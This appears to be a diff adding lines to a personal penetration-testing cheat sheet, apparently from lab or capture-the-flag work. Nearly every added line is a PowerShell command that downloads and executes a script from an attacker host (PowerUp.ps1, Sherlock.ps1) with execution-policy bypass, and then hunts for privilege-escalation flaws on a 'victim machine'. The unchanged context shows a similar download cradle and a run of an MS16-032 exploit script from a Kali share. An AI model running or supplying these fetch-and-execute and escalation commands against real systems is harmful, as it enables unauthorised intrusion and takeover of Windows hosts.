@@ -19,3 +19,15 @@ powershell IEX(New-Object Net.WebClient).downloadString(‘http://<attacking mac
 
 
 C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\10.10.14.124\kali\tools\enumeration\nmapAutomator\10.129.1.127\MS16-032.ps1
+
+###
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+###
+c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+###
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
+###
+If you have your ps1 file downloaded to the victim machine then run using this
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+###
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
